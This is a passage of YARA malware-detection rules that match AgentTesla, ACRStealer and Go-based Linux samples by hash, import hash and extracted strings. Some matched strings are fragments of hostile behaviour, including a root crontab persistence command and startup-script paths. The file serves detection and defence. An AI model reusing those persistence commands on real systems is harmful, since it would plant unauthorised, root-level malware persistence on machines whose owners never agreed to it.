      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_72c64472.exe, a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_da3f6cf2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72c644728850c6741c033d774ec5f1076faf5feaccca17b80b7f3f7817331566"
      hash2 = "da3f6cf27a03bd8e7463774e60dceea1aef6f1001e6450e66c2732c7bed3d092"
   strings:
      $s1 = "https://bloggingmetrics.com/" fullword wide /* score: '22.00'*/
      $s2 = "get_DependencyInjector" fullword ascii /* score: '19.00'*/
      $s3 = "GetPropertyInjectAttribute" fullword ascii /* score: '19.00'*/
      $s4 = "GetInjectedInstance" fullword ascii /* score: '19.00'*/
      $s5 = "GetConstructorInjectAttribute" fullword ascii /* score: '19.00'*/
      $s6 = "andExecuteFollowingCode" fullword ascii /* score: '18.00'*/
      $s7 = "Login Faild" fullword wide /* score: '18.00'*/
      $s8 = "Unable to inject a parameter that is not an interface or abstract type." fullword wide /* score: '18.00'*/
      $s9 = "SELECT * FROM tbl_users WHERE username = '" fullword wide /* score: '16.00'*/
      $s10 = "frmLogin" fullword wide /* score: '15.00'*/
      $s11 = "Login_and_Register.Properties" fullword ascii /* score: '15.00'*/
      $s12 = "Login_and_Register.frmLogin.resources" fullword ascii /* score: '15.00'*/
      $s13 = "Login_and_Register.frmRegister.resources" fullword ascii /* score: '15.00'*/
      $s14 = "clickLogin" fullword wide /* score: '15.00'*/
      $s15 = "Login_and_Register.frmDashboard.resources" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5e72fe9c_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_47 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e72fe9c.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fdc06824.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5e72fe9c6707f14a3a5b8d71812774a4880123f2742e4027be1c6bcee1dd6b09"
      hash2 = "fdc068245b964f655216d6aad8e2eefe51711317602f3b0dc1cc7178a84a8b86"
   strings:
      $s1 = "Batch processing completed!" fullword wide /* score: '18.00'*/
      $s2 = "https://github.com/css-minifier" fullword wide /* score: '17.00'*/
      $s3 = "btnProcessAll" fullword wide /* score: '15.00'*/
      $s4 = "btnProcessAll_Click" fullword ascii /* score: '15.00'*/
      $s5 = "Process All" fullword wide /* score: '15.00'*/
      $s6 = " Batch processing" fullword wide /* score: '15.00'*/
      $s7 = "cssContent" fullword ascii /* score: '9.00'*/
      $s8 = "GetMinifierSettings" fullword ascii /* score: '9.00'*/
      $s9 = "GetOptimizerSettings" fullword ascii /* score: '9.00'*/
      $s10 = "File Manager" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s11 = "Remove Comments" fullword wide /* score: '9.00'*/
      $s12 = " Combine selectors" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eae_48 {
   meta:
      description = "_subset_batch - from files 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash6 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s3 = "/*struct { F uintptr; pw *os.File; c *exec.Cmd }" fullword ascii /* score: '20.00'*/
      $s4 = "os.(*fileStat).Sys" fullword ascii /* score: '19.00'*/
      $s5 = "*struct { F uintptr; lookupGroupCtx context.Context; resolverFunc func(context.Context, string, string) ([]net.IPAddr, error); n" ascii /* score: '15.00'*/
      $s6 = "os.(*Process).setDone" fullword ascii /* score: '15.00'*/
      $s7 = "os.newProcess" fullword ascii /* score: '15.00'*/
      $s8 = "syscall.CloseOnExec" fullword ascii /* score: '15.00'*/
      $s9 = "os/signal.process" fullword ascii /* score: '15.00'*/
      $s10 = "os.(*Process).done" fullword ascii /* score: '15.00'*/
      $s11 = "asn1:\"optional,omitempty\"" fullword ascii /* score: '11.00'*/
      $s12 = "time.Time.date" fullword ascii /* score: '11.00'*/
      $s13 = "*struct { F uintptr; lookupGroupCtx context.Context; resolverFunc func(context.Context, string, string) ([]net.IPAddr, error); n" ascii /* score: '10.00'*/
      $s14 = "golang.org/x/crypto" fullword ascii /* score: '10.00'*/
      $s15 = "crypto/rsa.(*PrivateKey).Precompute" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 18000KB and pe.imphash() == "8a7d7cc34c52dce3570005ebd59ab8b0" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7b75b7d9_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_49 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7b75b7d9.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b56e8431.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7b75b7d9e892e63a9fd39ccb87222d7311b6a3e9cba68cd34dc650e15e295796"
      hash2 = "b56e8431fa939f346a93b8e6178fa2eddeaa734c3e53b42cc7cd2edc087a07e2"
   strings:
      $s1 = "daybreak.exe" fullword wide /* score: '22.00'*/
      $s2 = "DaybreakDX.exe" fullword wide /* score: '22.00'*/
      $s3 = "/config.dat" fullword wide /* score: '14.00'*/
      $s4 = "/addresslist.txt" fullword wide /* score: '14.00'*/
      $s5 = "getCurrentListAddress" fullword ascii /* score: '12.00'*/
      $s6 = "getAddresses" fullword ascii /* score: '12.00'*/
      $s7 = "HigurashiDaybreakConfig.FormConfig.resources" fullword ascii /* score: '10.00'*/
      $s8 = "HigurashiDaybreakConfig.FormMyConf.resources" fullword ascii /* score: '10.00'*/
      $s9 = "config.json" fullword wide /* score: '10.00'*/
      $s10 = "getShading" fullword ascii /* score: '9.00'*/
      $s11 = "getChat" fullword ascii /* score: '9.00'*/
      $s12 = "getShadows" fullword ascii /* score: '9.00'*/
      $s13 = "_getBool" fullword ascii /* score: '9.00'*/
      $s14 = "getVolVoice" fullword ascii /* score: '9.00'*/
      $s15 = "getVolmusic" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imph_50 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_28208e1b.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ff938366.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "781c06f67fe0461c4fee9c2c1e5529a9d57b1b038d3614cf86e1c64d13513c5f"
      hash2 = "28208e1b641b60fee3605621354ac86e3fb129a03e391a72c657cc3282287794"
      hash3 = "ff93836635f8fd88849fd7d411612740bd1e1d8c03dee062b0d822914634bb17"
   strings:
      $s1 = "This will attempt to enable System Protection. You may need administrator privileges. Continue?" fullword wide /* score: '23.00'*/
      $s2 = "https://github.com" fullword wide /* score: '21.00'*/
      $s3 = "GetSystemProtectionStatus" fullword ascii /* score: '19.00'*/
      $s4 = "Failed to enable System Protection. Please check your administrator privileges." fullword wide /* score: '17.00'*/
      $s5 = "{0:yyyy-MM-dd HH:mm:ss} - {1}" fullword wide /* score: '15.00'*/
      $s6 = "btnEnableSystemProtection" fullword wide /* score: '14.00'*/
      $s7 = "grpSystemProtection" fullword wide /* score: '14.00'*/
      $s8 = "chkSystemProtection" fullword wide /* score: '14.00'*/
      $s9 = "lblSystemProtectionStatus" fullword wide /* score: '14.00'*/
      $s10 = "IsSystemProtectionEnabled" fullword ascii /* score: '14.00'*/
      $s11 = "btnEnableSystemProtection_Click" fullword ascii /* score: '14.00'*/
      $s12 = "SELECT * FROM SystemRestoreConfig" fullword wide /* score: '14.00'*/
      $s13 = "Failed to create restore point. Please ensure you have administrator privileges." fullword wide /* score: '14.00'*/
      $s14 = "Failed to delete restore point. You may need administrator privileges." fullword wide /* score: '14.00'*/
      $s15 = "GetLastSystemScan" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__788a6795f7724e242272ee186b317217_imphash__ACRStealer_signature__788a6795f7724e242272ee186b317217_imph_51 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_788a6795f7724e242272ee186b317217(imphash).exe, ACRStealer(signature)_788a6795f7724e242272ee186b317217(imphash)_a16349c8.exe, ACRStealer(signature)_788a6795f7724e242272ee186b317217(imphash)_b139db41.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1278ddefe6ebc5a3f2da50b1c261ffea22cb789272ee2206b0ea30ff66d7d13f"
      hash2 = "a16349c834d68758f0b3b90ca54aa7a7ddc3f8119a3ec29364b587ba0249f42d"
      hash3 = "b139db41a37abf27d707e3c29c203f5ef6fd2c96953a4465069722eb556f6723"
   strings:
      $s1 = "TSLogSDK.dll" fullword ascii /* score: '28.00'*/
      $s2 = "lib_TSCommunication_sdk.dll" fullword wide /* score: '19.00'*/
      $s3 = "[%s](%d): %s pipe read faild, error code is %d" fullword ascii /* score: '19.00'*/
      $s4 = "F:\\Jenkins\\WorkSpace\\workspace\\lib_TSCommunication_sdk\\build_win_x64_RelWithDebInfo\\x86_64\\bin\\RelWithDebInfo\\lib_TSCom" ascii /* score: '18.00'*/
      $s5 = "[%s](%d): %s Failed to connect named pipe!" fullword ascii /* score: '16.00'*/
      $s6 = "[%s](%d): %s pipe write failed, error code is %d" fullword ascii /* score: '16.00'*/
      $s7 = "[%s](%d): Failed to create named pipe!" fullword ascii /* score: '16.00'*/
      $s8 = "F:\\Jenkins\\WorkSpace\\workspace\\lib_TSCommunication_sdk\\src\\SharedMemory.hpp" fullword ascii /* score: '15.00'*/
      $s9 = "[%s](%d): Init success, config dir: [%s], log file: [%s]" fullword ascii /* score: '15.00'*/
      $s10 = "F:\\Jenkins\\WorkSpace\\workspace\\lib_TSCommunication_sdk\\src\\NamePipe.hpp" fullword ascii /* score: '15.00'*/
      $s11 = "[%s](%d): Server bind failed !" fullword ascii /* score: '13.00'*/
      $s12 = "[%s](%d): Name pipe is %s init" fullword ascii /* score: '13.00'*/
      $s13 = "[%s](%d): Created named pipe successfully!" fullword ascii /* score: '13.00'*/
      $s14 = "name_pipe_read" fullword ascii /* score: '13.00'*/
      $s15 = "[%s](%d): Port multiplexing failed" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "788a6795f7724e242272ee186b317217" and ( 8 of them )
      ) or ( all of them )
}

rule _98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed_a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f_52 {
   meta:
      description = "_subset_batch - from files 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash2 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash3 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $x1 = "unsafe.String: len out of rangereflect: Len of non-array type reflect.MakeSlice: negative lenreflect.MakeSlice: negative capenco" ascii /* score: '72.50'*/
      $x2 = "invalid hostname: /dev/misc/watchdogreceived from peerframe_goaway_shortproxy-authenticateUNKNOWN_SETTING_%dGo-http-client/2.0Go" ascii /* score: '51.00'*/
      $x3 = "/etc/profile.d/bash.cfg/usr/lib/libgdi.so.0.8.2 { proc_name=$(/usr/bin/unexpected buffer len=%vinvalid pseudo-header %qframe_hea" ascii /* score: '46.00'*/
      $x4 = "mstartm not found in allmstopm holding lockssemaRoot rotateLeftbad notifyList sizeruntime: preempt g0runtime: pcdata is dodeltim" ascii /* score: '39.00'*/
      $x5 = "stack not a power of 2minpc or maxpc invalidtrace: alloc too largenon-Go function at pc=unexpected method stepreflect.Value.MapI" ascii /* score: '38.00'*/
      $x6 = "stopm spinning nmidlelocked= needspinning=store64 failedmemprofileratesemaRoot queuebad allocCountbad span statestack overflow u" ascii /* score: '35.00'*/
      $x7 = "/etc/init.d/boot.localIPv6: no supported yethttp2: frame too largewrite on closed bufferframe_data_pad_too_bigaccess-control-max" ascii /* score: '32.00'*/
      $s8 = "ProcessingNo ContentRST_STREAMEND_STREAMresumptionres binderres masterexp master12207031256103515625owner diedterminated/setgrou" ascii /* score: '30.00'*/
      $s9 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"division by zer" ascii /* score: '28.00'*/
      $s10 = "http: nil Request.URLUNKNOWN_FRAME_TYPE_%dframe_ping_has_streamnet/http: nil ContextPrecondition RequiredInternal Server Errorde" ascii /* score: '25.00'*/
      $s11 = ": TLS [http2: client conn not usablehttp: idle connection timeoutinternal error: took too muchframe_pushpromise_zero_streamframe" ascii /* score: '25.00'*/
      $s12 = "ks availableidentifier removedmultihop attemptedRFS specific errorstreams pipe errorconnection refusedoperation canceledsegmenta" ascii /* score: '21.00'*/
      $s13 = "sing addressunknown networkwrite heap dumpasyncpreemptoffforce gc (idle)sync.Mutex.Lockmalloc deadlockruntime error:   with GC p" ascii /* score: '21.00'*/
      $s14 = "stack: gp=scanstack - bad statusheadTailIndex overflowduplicated defer entryruntime.main not on m0set_crosscall2 missingbad g->s" ascii /* score: '21.00'*/
      $s15 = " different scopes)failed to get system page sizeassignment to entry in nil mapruntime: found in object at *( in prepareForSweep;" ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed_ab0306cebfad50676b63f7d45bef9d830cfb40097b65d2081_53 {
   meta:
      description = "_subset_batch - from files 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash2 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $x1 = "lock: lock countbad system huge page sizearena already initialized to unused region of spanunaligned sysNoHugePageOS/sched/gomax" ascii /* score: '65.50'*/
      $x2 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii /* score: '57.50'*/
      $x3 = "MapIter.Value called on exhausted iteratorx509: %q cannot be encoded as an IA5Stringx509: RSA modulus is not a positive numberwe" ascii /* score: '55.50'*/
      $x4 = "AllThreadsSyscall6 results differ between threads; runtime corruptedreflect: reflect.Value.UnsafePointer on an invalid notinheap" ascii /* score: '48.50'*/
      $x5 = "abiRegArgsType needs GC Prog, update methodValueCallFrameObjsexec: Cmd started a Process but leaked without a call to Waitx509: " ascii /* score: '48.50'*/
      $x6 = "sigaction failedexec: no command: value of type binary.BigEndianContent-Languageinvalid encodingGODEBUG: value \"division by zer" ascii /* score: '46.00'*/
      $x7 = "forEachP: sched.safePointWait != 0schedule: spinning with local workruntime: standard file descriptor runtime: g is running but " ascii /* score: '44.00'*/
      $x8 = "malformed response from server: malformed non-numeric status pseudo headernet/http: server replied with more than declared Conte" ascii /* score: '38.00'*/
      $s9 = "ed begin/end of activeSweepmheap.freeSpanLocked - invalid freeattempt to clear non-empty span setruntime: close polldesc w/o unb" ascii /* score: '27.00'*/
      $s10 = "exitsyscall: syscall frame is no longer validunsafe.String: ptr is nil and len is not zeroreflect: internal error: invalid metho" ascii /* score: '26.00'*/
      $s11 = "alformed extension OID fieldx509: wrong Ed25519 public key sizex509: invalid authority info accessinvalid utf8 payload in close " ascii /* score: '22.00'*/
      $s12 = "framehpack: invalid Huffman-encoded datadynamic table size update too largecrypto/md5: invalid hash state size'_' must separate " ascii /* score: '22.00'*/
      $s13 = "the definition of NAFecho \"*/1 * * * * root /.mod \" >> /etc/crontabnet/http: internal error: misuse of tryDelivernet/http: too" ascii /* score: '21.00'*/
      $s14 = "encodingx-forwarded-protoTransfer-EncodingX-Idempotency-KeyMoved PermanentlyFailed DependencyToo Many RequestsHEADER_TABLE_SIZEC" ascii /* score: '20.00'*/
      $s15 = "finishedexporter48828125strconv.parsing ParseIntno anode/uid_map/gid_mapThursdaySaturdayFebruaryNovemberDecembertime.UTC%!Month(" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ec_54 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash6 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash7 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash8 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s2 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s3 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s4 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s5 = "runtime.pollInfo.expiredReadDeadline" fullword ascii /* score: '10.00'*/
      $s6 = "compress/flate.(*byFreq).Len" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.startTheWorldGC" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.pollInfo.eventErr" fullword ascii /* score: '10.00'*/
      $s9 = "compress/flate.(*hcode).set" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.pollInfo.closing" fullword ascii /* score: '10.00'*/
      $s11 = "compress/flate.byFreq.Len" fullword ascii /* score: '10.00'*/
      $s12 = "compress/flate.byLiteral.Len" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.convT16" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.pollInfo.expiredWriteDeadline" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.stopTheWorldGC" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 21000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2_98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bb_55 {
   meta:
      description = "_subset_batch - from files 83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae_83361db2.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83361db2306f393fa5e8311bfba7019c7acf9bb95cf61ecf7aab09ab5e5a2dae"
      hash2 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash3 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash4 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "net.socket.listenerBacklog.func1" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.inlineFrame.valid" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.vdsoFindVersion" fullword ascii /* score: '13.00'*/
      $s4 = "compress/flate.NewReader.fixedHuffmanDecoderInit.func1" fullword ascii /* score: '12.00'*/
      $s5 = "sync/atomic.CompareAndSwapInt32" fullword ascii /* score: '11.00'*/
      $s6 = "sync/atomic.CompareAndSwapUint32" fullword ascii /* score: '11.00'*/
      $s7 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s8 = "@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s9 = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" fullword wide /* reversed goodware string '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' */ /* score: '11.00'*/
      $s10 = "runtime.vdsoParseSymbols" fullword ascii /* score: '10.00'*/
      $s11 = "runtime._ELF_ST_BIND" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.vdsoParseSymbols.func1" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.emptyfunc" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.inVDSOPage" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.vdsoInitFromSysinfoEhdr" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bb_56 {
   meta:
      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash3 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash4 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $x1 = " (normal) method: (MISSING)%!(EXTRA BigEndianrwxrwxrwxd.nx != 0underflowTRANSFORMPADDING_1PADDING_2InheritedquestionsClassINETAu" ascii /* score: '44.50'*/
      $x2 = " base exec: uint16uint32uint64stringstructchan<-<-chan ValueStringFormat[]byteCookieServerCommonspliceLengthheaderAnswercmd/goST" ascii /* score: '37.50'*/
      $x3 = " dst: 8.8.8.8:53 stream=%d:authorityset-cookieuser-agentConnectionkeep-aliveconnectionHost: %s" fullword ascii /* score: '35.50'*/
      $x4 = "<F><F><F><F>/usr/bin/dir/usr/bin/topinvalid atypcontent-typemax-forwardsout of range100-continuerecv_goaway_Multi-StatusNot Modi" ascii /* score: '32.00'*/
      $x5 = "types : type invaliduintptrfloat32float64SwapperChanDir Value>Ed25519MD2-RSAMD5-RSAserial:(PANIC=ExpiresSubjectSHA-224SHA-256SHA" ascii /* score: '31.00'*/
      $x6 = "runtime: sp=abi mismatchreflect.Copy/dev/urandomECDSA-SHA256ECDSA-SHA384ECDSA-SHA512SSL_CERT_DIR (no status)%!(BADWIDTH)randauto" ascii /* score: '31.00'*/
      $s7 = "thoritymath/randprintableomitemptyCloseProxyDeletelistStartProxyexsnn5ccvlUser-Agent/.ffff4444setenforcesystem.pubgateway.shdial" ascii /* score: '30.00'*/
      $s8 = "racemadvdontneedharddecommitdumping heapchan receive span.limit= span.state=bad flushGen MB stacks, worker mode  nDataRoots= nSp" ascii /* score: '27.00'*/
      $s9 = "bitsNameTypeasn1tag:Begin/.cfgSHELL/.modmount/tmp/start--add $@);/d');:***@<nil>rangehttpscloseRange:path%s %qHTTP/Foundtls: %s-" ascii /* score: '24.50'*/
      $s10 = "bitsNameTypeasn1tag:Begin/.cfgSHELL/.modmount/tmp/start--add $@);/d');:***@<nil>rangehttpscloseRange:path%s %qHTTP/Foundtls: %s-" ascii /* score: '24.50'*/
      $s11 = "UTCTimex509: invalid key usagex509: malformed versionmalformed ws or wss URLwebsocket: write closed (invalid payload data)<inval" ascii /* score: '24.00'*/
      $s12 = "er error/usr/bin/find/usr/bin/lsof/etc/rc.localcrond.service[ksoftirqd/0]read header: /dev/watchdogAuthorization[FrameHeader acc" ascii /* score: '24.00'*/
      $s13 = "linuxMarchAprilmonthLocalchdirwritechmodgetwdpipe2lstathostsfilesimap2imap3imapspop3sdefersweepschedhchansudoggscanmheaptracepan" ascii /* score: '23.00'*/
      $s14 = " base exec: uint16uint32uint64stringstructchan<-<-chan ValueStringFormat[]byteCookieServerCommonspliceLengthheaderAnswercmd/goST" ascii /* score: '23.00'*/
